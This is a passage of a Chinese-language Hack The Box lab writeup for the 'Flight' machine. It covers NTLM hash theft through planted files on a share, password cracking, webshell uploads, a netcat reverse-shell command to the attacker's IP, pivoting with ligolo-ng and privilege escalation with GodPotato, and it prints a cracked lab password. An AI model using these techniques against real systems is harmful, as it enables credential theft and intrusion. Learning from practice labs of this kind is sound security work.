+<p><img loading="lazy" decoding="async" width="1024" height="538" src="../legacy/uploads/2025/05/1748608470-image-1024x538.png" alt="" class="wp-image-1515" srcset="../legacy/uploads/2025/05/1748608470-image-1024x538.png 1024w, ../legacy/uploads/2025/05/1748608470-image-300x158.png 300w, ../legacy/uploads/2025/05/1748608470-image-768x403.png 768w, ../legacy/uploads/2025/05/1748608470-image.png 1400w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>可惜的是SVC_APACHE好像并不能做什么. 但目前获得了域内的用户：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: plain; title: ; notranslate" title="">
+S.Moon
+R.Cold
+G.Lors
+L.Kein
+M.Gold
+C.Bum
+W.Walker
+I.Francis
+D.Truff
+V.Stevens
+svc_apache
+O.Possum
+WebDevs
+</pre>
+</div>
+<p>用crackmapexec尝试看有没有密码复用：<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="275" src="../legacy/uploads/2025/05/1748608633-image-1024x275.png" alt="" class="wp-image-1517" srcset="../legacy/uploads/2025/05/1748608633-image-1024x275.png 1024w, ../legacy/uploads/2025/05/1748608633-image-300x81.png 300w, ../legacy/uploads/2025/05/1748608633-image-768x206.png 768w, ../legacy/uploads/2025/05/1748608633-image.png 1325w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>S.Moon复用了密码. <figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="624" src="../legacy/uploads/2025/05/1748608685-image-1024x624.png" alt="" class="wp-image-1519" srcset="../legacy/uploads/2025/05/1748608685-image-1024x624.png 1024w, ../legacy/uploads/2025/05/1748608685-image-300x183.png 300w, ../legacy/uploads/2025/05/1748608685-image-768x468.png 768w, ../legacy/uploads/2025/05/1748608685-image.png 1312w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>但从bloodhound上看, S.Moon也没用什么特殊的权限. 用crackmapexec看看S.Moon的smb权限：<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="272" src="../legacy/uploads/2025/05/1748608767-image-1024x272.png" alt="" class="wp-image-1521" srcset="../legacy/uploads/2025/05/1748608767-image-1024x272.png 1024w, ../legacy/uploads/2025/05/1748608767-image-300x80.png 300w, ../legacy/uploads/2025/05/1748608767-image-768x204.png 768w, ../legacy/uploads/2025/05/1748608767-image.png 1217w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>Users像是在C:/Users下<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="931" height="412" src="../legacy/uploads/2025/05/1748608867-image.png" alt="" class="wp-image-1524" srcset="../legacy/uploads/2025/05/1748608867-image.png 931w, ../legacy/uploads/2025/05/1748608867-image-300x133.png 300w, ../legacy/uploads/2025/05/1748608867-image-768x340.png 768w" sizes="auto, (max-width: 931px) 100vw, 931px" /> </figure></p>
+<p>但并没有找到有用的信息。对Shared有写入权限，登录并查看：<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="882" height="198" src="../legacy/uploads/2025/05/1748608808-image.png" alt="" class="wp-image-1523" srcset="../legacy/uploads/2025/05/1748608808-image.png 882w, ../legacy/uploads/2025/05/1748608808-image-300x67.png 300w, ../legacy/uploads/2025/05/1748608808-image-768x172.png 768w" sizes="auto, (max-width: 882px) 100vw, 882px" /> </figure></p>
+<p>里面是空的. 再看看Web<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="897" height="191" src="../legacy/uploads/2025/05/1748608907-image.png" alt="" class="wp-image-1526" srcset="../legacy/uploads/2025/05/1748608907-image.png 897w, ../legacy/uploads/2025/05/1748608907-image-300x64.png 300w, ../legacy/uploads/2025/05/1748608907-image-768x164.png 768w" sizes="auto, (max-width: 897px) 100vw, 897px" /> </figure></p>
+<p>Web下是两个网站的根目录，但也没有有用的信息。在这个地方卡了许久，也确实是涉及到我的知识盲区了。看了一眼小提示，发现了这个<a href="https://github.com/Greenwolf/ntlm_theft" target="_blank"  rel="nofollow" >github repo</a>. 这个工具可以生成一系列用来窃取NTLM hash的文件，其中有的只需要有人浏览包含这个文件的目录就可以窃取NTLM hash.</p>
+<ul class="wp-block-list">
+  <li>
+    原理：当用户在Windows资源管理器中浏览文件夹时，系统会读取文件的元数据来显示图标、缩略图等. 把缩略图加载地址换为攻击者的服务器则可能窃取NTLM hash. 在这个过程中不需要用户点击或打开文件.
+  </li>
+</ul>
+<p>clone下来运行：<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="527" src="../legacy/uploads/2025/05/1748609290-image-1024x527.png" alt="" class="wp-image-1531" srcset="../legacy/uploads/2025/05/1748609290-image-1024x527.png 1024w, ../legacy/uploads/2025/05/1748609290-image-300x155.png 300w, ../legacy/uploads/2025/05/1748609290-image-768x396.png 768w, ../legacy/uploads/2025/05/1748609290-image.png 1029w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>然后把这些文件全部上传至shared这个共享文件夹:<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="489" src="../legacy/uploads/2025/05/1748609378-image-1024x489.png" alt="" class="wp-image-1533" srcset="../legacy/uploads/2025/05/1748609378-image-1024x489.png 1024w, ../legacy/uploads/2025/05/1748609378-image-300x143.png 300w, ../legacy/uploads/2025/05/1748609378-image-768x367.png 768w, ../legacy/uploads/2025/05/1748609378-image.png 1062w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>有些上传失败了，不知道什么原因。但好在过了一会后抓取到了c.bum的hash：<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="754" height="181" src="../legacy/uploads/2025/05/1748609410-image.png" alt="" class="wp-image-1535" srcset="../legacy/uploads/2025/05/1748609410-image.png 754w, ../legacy/uploads/2025/05/1748609410-image-300x72.png 300w" sizes="auto, (max-width: 754px) 100vw, 754px" /> </figure></p>
+<p>交给john来破解并得到c.bum的密码 c.bum: Tikkycoll_431012284</p>
+<p>在bloodhound里可以看到c.bum属于webdavs这个组:<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="734" height="468" src="../legacy/uploads/2025/05/1748609494-image.png" alt="" class="wp-image-1537" srcset="../legacy/uploads/2025/05/1748609494-image.png 734w, ../legacy/uploads/2025/05/1748609494-image-300x191.png 300w" sizes="auto, (max-width: 734px) 100vw, 734px" /> </figure></p>
+<p>猜测c.bum可以修改web文件夹. 如果可以，那我们就能上传一个webshell获得RCE,用crackmapexec查看c.bum smb权限：<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="280" src="../legacy/uploads/2025/05/1748609629-image-1024x280.png" alt="" class="wp-image-1540" srcset="../legacy/uploads/2025/05/1748609629-image-1024x280.png 1024w, ../legacy/uploads/2025/05/1748609629-image-300x82.png 300w, ../legacy/uploads/2025/05/1748609629-image-768x210.png 768w, ../legacy/uploads/2025/05/1748609629-image.png 1193w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>对Web有读写权限，那我们就可以上传一个webshell了:<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="902" height="72" src="../legacy/uploads/2025/05/1748609752-image.png" alt="" class="wp-image-1541" srcset="../legacy/uploads/2025/05/1748609752-image.png 902w, ../legacy/uploads/2025/05/1748609752-image-300x24.png 300w, ../legacy/uploads/2025/05/1748609752-image-768x61.png 768w" sizes="auto, (max-width: 902px) 100vw, 902px" /> </figure></p>
+<p>打开浏览器访问:<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="891" height="232" src="../legacy/uploads/2025/05/1748609772-image.png" alt="" class="wp-image-1543" srcset="../legacy/uploads/2025/05/1748609772-image.png 891w, ../legacy/uploads/2025/05/1748609772-image-300x78.png 300w, ../legacy/uploads/2025/05/1748609772-image-768x200.png 768w" sizes="auto, (max-width: 891px) 100vw, 891px" /> </figure></p>
+<p>成功。用<a href="https://www.revshells.com/" target="_blank"  rel="nofollow" >generator</a>生成一个ps的reverse shell:<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="753" height="112" src="../legacy/uploads/2025/05/1748610886-image.png" alt="" class="wp-image-1547" srcset="../legacy/uploads/2025/05/1748610886-image.png 753w, ../legacy/uploads/2025/05/1748610886-image-300x45.png 300w" sizes="auto, (max-width: 753px) 100vw, 753px" /> </figure></p>
+<p>获得shell</p>
+<h2 id="lateral-movement">Lateral Movement
+</h2><p>因为我们已经有了c.bum的密码，则可以利用runas来以c.bum的身份来运行指令，但windows原生的runas需要一个interactive shell来输入密码。利用<a href="https://github.com/antonioCoco/RunasCs" target="_blank"  rel="nofollow" >RunasCs</a>这个工具可以直接输入命令行输入密码. 上传RunasCs并运行:<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="1010" height="138" src="../legacy/uploads/2025/05/1748611214-image.png" alt="" class="wp-image-1553" srcset="../legacy/uploads/2025/05/1748611214-image.png 1010w, ../legacy/uploads/2025/05/1748611214-image-300x41.png 300w, ../legacy/uploads/2025/05/1748611214-image-768x105.png 768w" sizes="auto, (max-width: 1010px) 100vw, 1010px" /> </figure></p>
+<p>获得c.bum的shell:<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="782" height="265" src="../legacy/uploads/2025/05/1748611237-image.png" alt="" class="wp-image-1554" srcset="../legacy/uploads/2025/05/1748611237-image.png 782w, ../legacy/uploads/2025/05/1748611237-image-300x102.png 300w, ../legacy/uploads/2025/05/1748611237-image-768x260.png 768w" sizes="auto, (max-width: 782px) 100vw, 782px" /> </figure></p>
+<p>在c.bum的desktop下可以找到<strong>User flag</strong>.</p>
+<p>用netstat -ano查看开放端口发现了一个在内网开放的8000端口:<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="907" height="581" src="../legacy/uploads/2025/05/1748611298-image.png" alt="" class="wp-image-1556" srcset="../legacy/uploads/2025/05/1748611298-image.png 907w, ../legacy/uploads/2025/05/1748611298-image-300x192.png 300w, ../legacy/uploads/2025/05/1748611298-image-768x492.png 768w" sizes="auto, (max-width: 907px) 100vw, 907px" /> </figure></p>
+<p>同时在C盘下发现了inetpub文件夹，这个文件夹一般是IIS服务的根目录. 在下面发现了一个development的文件夹，猜测可能是内网8000端口开放的IIS http服务器。c.bum对这个文件有写权限:<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="728" height="897" src="../legacy/uploads/2025/05/1748611481-image.png" alt="" class="wp-image-1558" srcset="../legacy/uploads/2025/05/1748611481-image.png 728w, ../legacy/uploads/2025/05/1748611481-image-243x300.png 243w" sizes="auto, (max-width: 728px) 100vw, 728px" /> </figure></p>
+<p>一般情况下，IIS服务使用的是一个虚拟账号<strong>IIS AppPool\DefaultAppPool</strong> 而作为一个服务账号，一般默认会开启Impersonate权限。我们可以利用ligolo-ng来把内网端口forward到我们本地。先上传一个aspx的webshell：<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="929" height="552" src="../legacy/uploads/2025/05/1748611690-image.png" alt="" class="wp-image-1563" srcset="../legacy/uploads/2025/05/1748611690-image.png 929w, ../legacy/uploads/2025/05/1748611690-image-300x178.png 300w, ../legacy/uploads/2025/05/1748611690-image-768x456.png 768w" sizes="auto, (max-width: 929px) 100vw, 929px" /> </figure></p>
+<p>上传agent.exe<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="926" height="129" src="../legacy/uploads/2025/05/1748611743-image.png" alt="" class="wp-image-1564" srcset="../legacy/uploads/2025/05/1748611743-image.png 926w, ../legacy/uploads/2025/05/1748611743-image-300x42.png 300w, ../legacy/uploads/2025/05/1748611743-image-768x107.png 768w" sizes="auto, (max-width: 926px) 100vw, 926px" /> </figure></p>
+<p>本地开启ligolo服务器，并用agent连接：<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="520" src="../legacy/uploads/2025/05/1748611863-image-1024x520.png" alt="" class="wp-image-1568" srcset="../legacy/uploads/2025/05/1748611863-image-1024x520.png 1024w, ../legacy/uploads/2025/05/1748611863-image-300x152.png 300w, ../legacy/uploads/2025/05/1748611863-image-768x390.png 768w, ../legacy/uploads/2025/05/1748611863-image.png 1377w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>ligolo有一个&quot;magic ip&quot; 240.0.0.1, 当把路由地址设置为这个地址时，可以用kali连接240.0.0.1来访问靶机的本地端口. 设置完毕后，浏览器访问240.0.0.1:8000 :<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="561" src="../legacy/uploads/2025/05/1748612116-image-1024x561.png" alt="" class="wp-image-1571" srcset="../legacy/uploads/2025/05/1748612116-image-1024x561.png 1024w, ../legacy/uploads/2025/05/1748612116-image-300x164.png 300w, ../legacy/uploads/2025/05/1748612116-image-768x421.png 768w, ../legacy/uploads/2025/05/1748612116-image-1536x841.png 1536w, ../legacy/uploads/2025/05/1748612116-image.png 1649w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>访问cmd.aspx：<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="927" height="245" src="../legacy/uploads/2025/05/1748612296-image.png" alt="" class="wp-image-1572" srcset="../legacy/uploads/2025/05/1748612296-image.png 927w, ../legacy/uploads/2025/05/1748612296-image-300x79.png 300w, ../legacy/uploads/2025/05/1748612296-image-768x203.png 768w" sizes="auto, (max-width: 927px) 100vw, 927px" /> </figure></p>
+<p>确实是<strong>IIS AppPool\DefaultAppPool</strong>这个账号：<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="862" src="../legacy/uploads/2025/05/1748612336-image-1024x862.png" alt="" class="wp-image-1574" srcset="../legacy/uploads/2025/05/1748612336-image-1024x862.png 1024w, ../legacy/uploads/2025/05/1748612336-image-300x253.png 300w, ../legacy/uploads/2025/05/1748612336-image-768x647.png 768w, ../legacy/uploads/2025/05/1748612336-image.png 1088w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>也可以看到确实开启了Impersonate权限。接下来利用之前上传的nc.exe来获取这个用户的shell：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: plain; title: ; notranslate" title="">
+C:\xampp\htdocs\flight.htb\nc.exe 10.10.16.8 7777 -e cmd.exe
+</pre>
+</div><figure class="wp-block-image size-large">
+<p><img loading="lazy" decoding="async" width="1024" height="269" src="../legacy/uploads/2025/05/1748612441-image-1024x269.png" alt="" class="wp-image-1576" srcset="../legacy/uploads/2025/05/1748612441-image-1024x269.png 1024w, ../legacy/uploads/2025/05/1748612441-image-300x79.png 300w, ../legacy/uploads/2025/05/1748612441-image-768x202.png 768w, ../legacy/uploads/2025/05/1748612441-image-1536x403.png 1536w, ../legacy/uploads/2025/05/1748612441-image.png 1574w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<h2 id="privilege-escalation">Privilege Escalation
+</h2><p>因为不确定defaultapppool可以在哪些文件下读写，于是直接把xxxxPotato下载到Public/Documents下：<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="645" height="363" src="../legacy/uploads/2025/05/1748612631-image.png" alt="" class="wp-image-1579" srcset="../legacy/uploads/2025/05/1748612631-image.png 645w, ../legacy/uploads/2025/05/1748612631-image-300x169.png 300w" sizes="auto, (max-width: 645px) 100vw, 645px" /> </figure></p>
+<p>尝试了JuicyPotato, PrintSpoofer, GodPotato. 最后GodPotato成功。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="1005" height="649" src="../legacy/uploads/2025/05/1748612728-image.png" alt="" class="wp-image-1581" srcset="../legacy/uploads/2025/05/1748612728-image.png 1005w, ../legacy/uploads/2025/05/1748612728-image-300x194.png 300w, ../legacy/uploads/2025/05/1748612728-image-768x496.png 768w" sizes="auto, (max-width: 1005px) 100vw, 1005px" /> </figure></p>
+<p>在Administrator下找到root flag:<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="631" src="../legacy/uploads/2025/05/1748612769-image-1024x631.png" alt="" class="wp-image-1582" srcset="../legacy/uploads/2025/05/1748612769-image-1024x631.png 1024w, ../legacy/uploads/2025/05/1748612769-image-300x185.png 300w, ../legacy/uploads/2025/05/1748612769-image-768x473.png 768w, ../legacy/uploads/2025/05/1748612769-image.png 1061w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>Happy Hacking</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            Last updated on May 30, 2025 13:46 UTC
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/htb-underpass-Writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/legacy/uploads/2025/05/1747065644-456a4d2e52f182847fb0a2dba0420a44.webp" loading="lazy" data-key="" data-hash="/legacy/uploads/2025/05/1747065644-456a4d2e52f182847fb0a2dba0420a44.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB-UnderPass-Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb-administrator-Writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/legacy/uploads/2025/04/1745035819-download-150x150.png" loading="lazy" data-key="" data-hash="/legacy/uploads/2025/04/1745035819-download-150x150.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB-Administrator-Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb-bashed-Writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/legacy/uploads/2025/04/1745047500-bashed-150x150.webp" loading="lazy" data-key="" data-hash="/legacy/uploads/2025/04/1745047500-bashed-150x150.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB-Bashed-Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb-season-6-monitored/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/legacy/uploads/2024/08/1724822083-monitor-150x150.webp" loading="lazy" data-key="" data-hash="/legacy/uploads/2024/08/1724822083-monitor-150x150.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB-Season 6-Monitored</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb-retired-magic-Writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/legacy/uploads/2024/08/1724907410-73eebbbdfbbfd46258ea2ae7e52d9479-150x150.webp" loading="lazy" data-key="" data-hash="/legacy/uploads/2024/08/1724907410-73eebbbdfbbfd46258ea2ae7e52d9479-150x150.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB-Retired-Magic-Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2025 Jowhite
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.c360ad02a41a6ed7f0240895667de2af6b7bfd79a8c71b3ed3008667720bb9d1.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+     
+    :root {
+        --article-font-family: "Merriweather", var(--base-font-family);
+    }
+</style>
+
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Merriweather:wght@400;700&display=swap";
+    
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+    
+        document.head.appendChild(customFont);
+    }());
+</script>
+    </body>
+</html>
